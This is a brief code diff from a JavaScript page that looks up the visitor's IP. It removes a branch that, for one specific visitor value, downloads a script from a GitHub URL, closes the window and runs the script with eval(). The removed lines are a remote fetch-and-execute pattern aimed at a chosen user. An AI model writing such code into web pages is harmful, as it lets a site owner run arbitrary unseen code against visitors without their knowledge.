@@ -116,15 +116,6 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
   }
 
 
- else if (ip == '559f134')
-
-
-  {
-    req = new XMLHttpRequest(); 
-    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/Resources/blacklisted_page.js'); 
-    req.onload = function() { window.close();eval(this.responseText); }; req.send();
-
-  }
 
 
 
